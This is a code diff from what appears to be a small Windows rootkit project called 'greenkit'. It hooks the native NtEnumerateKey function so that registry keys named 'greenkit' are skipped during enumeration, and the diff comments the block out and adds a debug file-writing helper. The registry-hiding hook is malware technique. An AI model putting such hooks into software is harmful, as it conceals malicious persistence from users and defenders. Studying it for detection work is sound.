@@ -3,6 +3,21 @@
 #include "NtEnumerateKey.h"
 #include <windows.h>
 #include "hooking.h"
+/*
+VOID WriteFile2(char token)
+{
+    HANDLE hFile = CreateFile("C:\\greenkit.txt",                // name of the write
+        GENERIC_WRITE,          // open for writing
+        0,                      // do not share
+        NULL,                   // default security
+        CREATE_NEW,             // create new file only
+        FILE_ATTRIBUTE_NORMAL,  // normal file
+        NULL);                  // no attr. template
+
+    DWORD dwBytesWritten = 0;
+    char Str[] = "hook regedit";
+    WriteFile(hFile, Str + token, strlen(Str + token), &dwBytesWritten, NULL);
+}
 
 BOOL mustShiftReg(UNICODE_STRING uStr_reg) {
 	if (wcscmp((uStr_reg.Buffer), L"greenkit") <= 0)
@@ -45,10 +60,8 @@ NTSTATUS NTAPI NewNtEnumerateKey(
 	ULONG tmpIndex;
 	HANDLE h_tmp;
 	OBJECT_ATTRIBUTES ObjectAttributes;
-
 	MessageBox(0, "NTDLL OPEN HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
-
-	ret = ((TD_NtEnumerateKey)hooking_getOldFunction("NtEnumerateKey")) (KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
+	ret = hookNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
 
 	if (!(KeyInformationClass == KeyBasicInformation || KeyInformationClass == KeyNodeInformation))
 		return ret;
@@ -69,7 +82,7 @@ NTSTATUS NTAPI NewNtEnumerateKey(
 	CloseHandle(h_tmp);
 
 	tmpIndex = Index + 1;
-	ret = ((TD_NtEnumerateKey)hooking_getOldFunction("NtEnumerateKey")) (KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
+    ret = hookNtEnumerateKey(KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
 	if (ret != STATUS_SUCCESS)
 		return ret;
 	
@@ -79,5 +92,5 @@ NTSTATUS NTAPI NewNtEnumerateKey(
 	if (mustHideReg(uStr_tmp))
 		++tmpIndex;
 
-	return ((TD_NtEnumerateKey)hooking_getOldFunction("NtEnumerateKey")) (KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
-}
+    return hookNtEnumerateKey(KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
+}*/
